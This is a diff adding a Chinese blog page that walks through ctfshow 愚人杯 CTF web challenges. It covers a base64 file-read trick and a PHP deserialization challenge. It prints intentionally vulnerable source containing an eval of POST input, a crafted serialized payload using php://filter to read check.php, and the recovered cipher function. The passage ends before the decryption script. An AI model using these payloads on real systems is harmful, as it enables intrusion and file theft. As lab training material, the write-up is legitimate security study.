@@ -1,0 +1,937 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="leekos">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="ctfshow【愚人杯】webeasy_signin打开发现：url 1http:&#x2F;&#x2F;b96d3820-fc5d-4c61-9007-68ae2b60a743.challenge.ctf.show&#x2F;?img&#x3D;aW5kZXgucGhw  img参数被base64编码，解码后发现是face.png 于是我们想到，可以将index.php进行base64编码，使用get传参  图片路径base64解压得">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow_愚人杯">
+<meta property="og:url" content="https://leekosss.github.io/2023/08/24/ctfshow_%E6%84%9A%E4%BA%BA%E6%9D%AF/index.html">
+<meta property="og:site_name" content="Tranquility">
+<meta property="og:description" content="ctfshow【愚人杯】webeasy_signin打开发现：url 1http:&#x2F;&#x2F;b96d3820-fc5d-4c61-9007-68ae2b60a743.challenge.ctf.show&#x2F;?img&#x3D;aW5kZXgucGhw  img参数被base64编码，解码后发现是face.png 于是我们想到，可以将index.php进行base64编码，使用get传参  图片路径base64解压得">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202304032324899.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202304081701840.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202304081711847.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202304032349225.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202304040003579.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202304040007847.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202304040019918.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202304040022371.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202304040027945.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202304040028988.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202304040029129.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202304040031891.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202304040037458.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202304041430509.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202304041432688.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202304041446078.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202304040042504.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202304040043253.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202304040044863.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202304040047362.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202304040048484.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202304041104645.png">
+<meta property="article:published_time" content="2023-08-24T14:38:04.550Z">
+<meta property="article:modified_time" content="2023-06-05T06:58:40.283Z">
+<meta property="article:author" content="leekos">
+<meta property="article:tag" content="ctfshow_愚人杯">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202304032324899.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>ctfshow_愚人杯 - Tranquility</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"leekosss.github.io","root":"/","version":"1.9.5-a","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Tranquility</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="ctfshow_愚人杯"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-08-24 22:38" pubdate>
+          2023年8月24日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          22k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          184 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">ctfshow_愚人杯</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2023年6月5日 下午
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="ctfshow【愚人杯】"><a href="#ctfshow【愚人杯】" class="headerlink" title="ctfshow【愚人杯】"></a>ctfshow【愚人杯】</h2><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="easy-signin"><a href="#easy-signin" class="headerlink" title="easy_signin"></a>easy_signin</h4><p>打开发现：url</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://b96d3820-fc5d-<span class="hljs-number">4</span>c61-<span class="hljs-number">9007</span>-<span class="hljs-number">68</span>ae2b60a743.challenge.ctf.show/?img=aW5kZXgucGhw<br></code></pre></td></tr></table></figure>
+
+<p>img参数被base64编码，解码后发现是<code>face.png</code></p>
+<p>于是我们想到，可以将index.php进行base64编码，使用get传参</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304032324899.png" srcset="/img/loading.gif" lazyload alt="image-20230403232405829"></p>
+<p>图片路径base64解压得到flag</p>
+<h4 id="被遗忘的反序列化"><a href="#被遗忘的反序列化" class="headerlink" title="被遗忘的反序列化"></a>被遗忘的反序列化</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment"># 当前目录中有一个txt文件哦</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;check.php&quot;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EeE</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eeee</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;text == <span class="hljs-string">&quot;aaaa&quot;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">lcfirst</span>(<span class="hljs-variable">$this</span>-&gt;text);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$kk</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$kk</span>,eeeeeeeeeeeee&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__clone</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> cycycycy;<br>        <span class="hljs-variable">$a</span> -&gt; <span class="hljs-title function_ invoke__">aaa</span>();<br>    &#125;<br>    <br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cycycycy</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$b</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">aaa</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$get</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;get&#x27;</span>];<br>        <span class="hljs-variable">$get</span> = <span class="hljs-title function_ invoke__">cipher</span>(<span class="hljs-variable">$get</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$get</span> === <span class="hljs-string">&quot;p8vfuv8g8v8py&quot;</span>)&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;eval&quot;</span>]);<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$a_a</span> = <span class="hljs-variable language_">$this</span> -&gt; a;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\$a_a\$&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gBoBg</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$coos</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$eeee</span>=<span class="hljs-string">&quot;-_-&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;name))&#123;<br>            <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">coos</span>(<span class="hljs-variable">$this</span>-&gt;file);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span> -&gt; file))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;coos-&gt;name;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$aa</span> = <span class="hljs-variable language_">$this</span>-&gt;coos;<br>            <span class="hljs-variable">$bb</span> = <span class="hljs-variable language_">$this</span>-&gt;file;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$aa</span>();<br>        &#125;<br>    &#125;<br>&#125;   <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w_wuw_w</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$aaa</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/php|63|\*|\?/i&quot;</span>,<span class="hljs-variable">$this</span> -&gt; key))&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;key = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span> -&gt; file);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;不行哦&quot;</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;aaa;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span> -&gt; aaa = <span class="hljs-keyword">clone</span> <span class="hljs-keyword">new</span> EeE;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$_ip</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;HTTP_AAAAAA&quot;</span>];<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_ip</span>);<br></code></pre></td></tr></table></figure>
+
+
+
+<p>我们观察到：<code>$_SERVER[&quot;HTTP_AAAAAA&quot;]</code> ，意思是我们需要在header头中传入名为<code>AAAAAA</code>的头，进行传参</p>
+<p>首先我们看到类 <code>cycycycy</code>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cycycycy</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">aaa</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$get</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;get&#x27;</span>];<br>        <span class="hljs-variable">$get</span> = <span class="hljs-title function_ invoke__">cipher</span>(<span class="hljs-variable">$get</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$get</span> === <span class="hljs-string">&quot;p8vfuv8g8v8py&quot;</span>)&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;eval&quot;</span>]);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里可以进行代码执行，但是我们并不知道<code>cipher()</code>函数是什么，并且需要使get传参后的值经过cipher加密后为：<code>p8vfuv8g8v8py</code>，<code>cipher()</code>应该是在<code>check.php</code>中</p>
+<p>然后我们注意到类 <code>w_wuw_w</code>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w_wuw_w</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$aaa</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/php|63|\*|\?/i&quot;</span>,<span class="hljs-variable">$this</span> -&gt; key))&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;key = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span> -&gt; file);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里存在文件包含漏洞，于是我们想要去读取<code>check.php</code>，构造：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w_wuw_w</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$aaa</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br><br><br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">w_wuw_w</span>();<br><span class="hljs-variable">$a</span>-&gt;file = <span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=check.php&quot;</span>;<br><span class="hljs-variable">$a</span>-&gt;aaa=&amp;<span class="hljs-variable">$a</span>-&gt;key;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><br>输出：<br>O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;w_wuw_w&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;aaa&quot;</span>;N;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;key&quot;</span>;R:<span class="hljs-number">2</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;file&quot;</span>;s:<span class="hljs-number">53</span>:<span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=check.php&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里我们让 <code>$aaa</code>去指向<code>$key</code>的那片内存空间，这样我们就能通过$aaa去输出读取到的文件内容了，</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304081701840.png" srcset="/img/loading.gif" lazyload alt="image-20230408170131757"></p>
+<p>base64解密，得到<code>check.php</code>内容：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cipher</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>) </span>&#123;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>)&gt;<span class="hljs-number">10000</span>)&#123;<br>        <span class="hljs-keyword">exit</span>(-<span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$charset</span> = <span class="hljs-string">&quot;qwertyuiopasdfghjklzxcvbnm123456789&quot;</span>;<br>    <span class="hljs-variable">$shift</span> = <span class="hljs-number">4</span>;<br>    <span class="hljs-variable">$shifted</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>); <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$char</span> = <span class="hljs-variable">$str</span>[<span class="hljs-variable">$i</span>];<br>        <span class="hljs-variable">$pos</span> = <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$charset</span>, <span class="hljs-variable">$char</span>);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pos</span> !== <span class="hljs-literal">false</span>) &#123;<br>            <span class="hljs-variable">$new_pos</span> = (<span class="hljs-variable">$pos</span> - <span class="hljs-variable">$shift</span> + <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$charset</span>)) % <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$charset</span>);<br>            <span class="hljs-variable">$shifted</span> .= <span class="hljs-variable">$charset</span>[<span class="hljs-variable">$new_pos</span>];<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$shifted</span> .= <span class="hljs-variable">$char</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$shifted</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里定义了 <code>cipher()</code>函数，我们写一个解密脚本：</p>
